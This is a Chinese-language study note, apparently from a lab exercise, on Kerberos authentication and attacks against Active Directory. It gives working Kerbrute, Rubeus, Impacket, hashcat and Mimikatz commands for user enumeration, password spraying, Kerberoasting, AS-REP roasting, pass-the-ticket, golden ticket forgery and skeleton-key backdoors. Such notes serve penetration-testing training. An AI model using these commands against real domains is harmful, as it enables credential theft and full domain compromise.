#### Kerberos 基础 (Kerberos Fundamentals)

**Kerberos** 是 Microsoft Windows 域环境的默认认证协议，旨在通过使用票据授权和强加密来提供比 NTLM 更安全的认证。

##### 常用术语 (Common Terminology)

- **密钥分发中心 (KDC - Key Distribution Center)**: 域控制器上的一个服务，负责发放票据。它包含两个子服务：
    
    - **认证服务 (AS - Authentication Service)**: 验证用户身份并发放 TGT。
        
    - **票据授予服务 (TGS - Ticket Granting Service)**: 验证 TGT 并发放服务票据。
        
- **票据授予票据 (TGT - Ticket-Granting Ticket)**: 用户的“域内通行证”。用户使用它向 TGS 请求访问特定服务的票据，而无需每次都输入密码。
    
- **服务票据 (Service Ticket / TGS Ticket)**: 允许用户访问特定服务（如文件共享、Web 应用）的票据。
    
- **服务主体名称 (SPN - Service Principal Name)**: 服务实例（如 `HTTP/webapp.domain.local`）的唯一标识符，用于将服务与一个域服务账户关联起来。
    
- **特权属性证书 (PAC - Privilege Attribute Certificate)**: 包含用户授权信息（如 SID、组成员身份）的数据结构，由 KDC 签名并嵌入到票据中。
    

##### Kerberos 认证流程 (The Kerberos Authentication Process)

1. **AS-REQ**: 客户端向 KDC 的**认证服务 (AS)** 请求一个 TGT。请求中包含一个用客户端密码哈希加密的时间戳（预认证）。
    
2. **AS-REP**: KDC 验证时间戳，如果成功，则向客户端发送一个用 `krbtgt` 账户密钥加密的 TGT 和一个用客户端密码哈希加密的会话密钥。
    
3. **TGS-REQ**: 客户端向 KDC 的**票据授予服务 (TGS)** 发送 TGT、会话密钥和一个认证符，并请求访问某个特定服务的 SPN。
    
4. **TGS-REP**: KDC 验证 TGT，如果成功，则向客户端发送一个用目标服务账户密钥加密的服务票据。
    
5. **AP-REQ**: 客户端向目标服务出示服务票据和一个新的认证符。
    
6. **AP-REP**: 目标服务验证服务票据，如果成功，则授予客户端访问权限。
    

##### 攻击权限要求 (Attack Permission Requirements)

|攻击类型|所需权限|
|---|---|
|**Kerbrute 用户枚举**|无需域访问权限|
|**票据传递 (Pass-The-Ticket)**|需要以任意用户身份访问域内主机|
|**Kerberoasting**|需要以任意用户身份访问域|
|**AS-REP Roasting**|需要以任意用户身份访问域|
|**黄金票据 (Golden Ticket)**|**完全域控** (域管理员或等效权限)|
|**白银票据 (Silver Ticket)**|需要目标服务的密码哈希|
|**万能钥匙 (Skeleton Key)**|**完全域控** (域管理员或等效权限)|

#### 枚举：使用 Kerbrute (Enumeration: Using Kerbrute)

**Kerbrute** 通过滥用 Kerberos 预认证机制来暴力破解和枚举有效的 AD 用户名。

- **优势**: 这种方法不会在域控制器上触发“账户登录失败”的日志事件，因此比针对其他协议（如 SMB）的暴力破解更隐蔽。
    
- **命令**:
    
    Bash
    
    ```
    ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
    ```
    

#### 攻击：使用 Rubeus (Attacks: Using Rubeus)

**Rubeus** 是一款功能极其强大的 .NET Kerberos 交互工具。

##### 票据收集 (Ticket Harvesting)

在已攻陷的主机上，可以使用 Rubeus 持续监视内存并导出新登录用户的 TGT。

PowerShell

```
Rubeus.exe harvest /interval:30
```

##### 暴力破解与密码喷洒 (Brute-Forcing and Password Spraying)

Rubeus 可以对用户进行密码喷洒，并直接获取成功的 TGT 票据。

PowerShell

```
# 将一个密码("Password1")喷洒到所有用户
Rubeus.exe brute /password:Password1 /noticket
```

##### Kerberoasting

此攻击利用了任何域用户都有权为任意服务请求服务票据的机制。

1. **请求服务票据**: Rubeus (或 Impacket 的 `GetUserSPNs.py`) 请求与配置了 SPN 的服务账户关联的服务票据。
    
2. **提取哈希**: 该票据的一部分是用服务账户的 NTLM 密码哈希加密的。攻击者可以离线提取这部分。
    
3. **离线破解**: 使用 `hashcat` 对提取的哈希进行暴力破解。
    

- **Rubeus 命令**:
    
    PowerShell
    
    ```
    # 查找并导出所有可被 Kerberoasting 的账户的哈希
    Rubeus.exe kerberoast
    ```
    
- **Impacket 命令** (可远程执行):
    
    Bash
    
    ```
    python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.171.253 -request
    ```
    
- **Hashcat 命令** (模式 13100):
    
    Bash
    
    ```
    hashcat -m 13100 -a 0 hash.txt Pass.txt
    ```
    

##### AS-REP Roasting

此攻击利用了某些用户账户被错误配置为**“不需要 Kerberos 预认证”**的弱点。

1. **请求 TGT**: 攻击者可以为这些用户请求 TGT，KDC 会直接返回一个用该用户密码哈希加密的 TGT，而无需预先验证。
    
2. **提取哈希**: 攻击者可以从返回的 TGT 中提取可破解的哈希 (`krbasrep5`)。
    
3. **离线破解**: 使用 `hashcat` 进行暴力破解。
    

- **Rubeus 命令**:
    
    PowerShell
    
    ```
    # 自动查找并导出所有可被 AS-REP Roasting 的账户的哈希
    Rubeus.exe asreproast
    ```
    
- **Hashcat 命令** (模式 18200):
    
    Bash
    
    ```
    # 注意：需要手动在 Rubeus 导出的哈希 "$krb5asrep$" 后面添加 "23$"
    hashcat -m 18200 hash.txt Pass.txt
    ```
    

#### 攻击：使用 Mimikatz (Attacks: Using Mimikatz)

**Mimikatz** 是 Windows 后渗透测试中用于凭证窃取的瑞士军刀。

##### 票据传递 (Pass-The-Ticket)

此攻击从已攻陷主机的 LSASS 内存中导出 Kerberos 票据，并将其注入到当前会话中，从而冒充票据的原始所有者。

1. **启动 Mimikatz**: `mimikatz.exe`
    
2. **提升权限**: `privilege::debug`
    
3. **导出所有票据**: `sekurlsa::tickets /export` (这将把所有 `.kirbi` 票据文件保存在当前目录)。
    
4. **注入票据**:
    
    ```
    kerberos::ptt ticket.kirbi
    ```
    
5. **验证**: `klist` (查看当前会话中的票据)。
    

##### 黄金票据与白银票据 (Golden & Silver Tickets)

- **黄金票据**: 伪造的 **TGT**。通过窃取 `krbtgt` 账户的密码哈希，攻击者可以创建任意用户（包括不存在的用户）的 TGT，从而获得对域内**任何服务**的访问权限。这是**终极的持久化后门**。
    
- **白银票据**: 伪造的**服务票据**。通过窃取特定服务（如 `CIFS`, `MSSQL`）账户的密码哈希，攻击者可以创建访问**该特定服务**的票据。它比黄金票据更隐蔽。
    
- **创建黄金票据**:
    
    1. **获取 krbtgt 哈希和 SID**:
        
        ```
        lsadump::lsa /inject /name:krbtgt
        ```
        
    2. **伪造票据**:
        
        ```
        kerberos::golden /user:Administrator /domain:controller.local /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500
        ```
        
    3. **使用票据**: `misc::cmd` (打开一个注入了黄金票据的新命令提示符)。
        

##### Kerberos 后门 (Skeleton Key)

这是一种内存补丁技术，它会修改域控制器上的 LSASS 进程，使其在验证 Kerberos 预认证时，除了验证用户的真实密码哈希外，还会接受一个**万能密码 (master password)**。

- **部署**:
    
    ```
    misc::skeleton
    ```
    
- **使用**: 部署后，你可以使用**任何**域用户的用户名和硬编码的万能密码（默认为 `mimikatz`）来访问域内的任何资源。
    
- **注意**: 这是一个**非持久化**的后门，域控制器重启后会失效。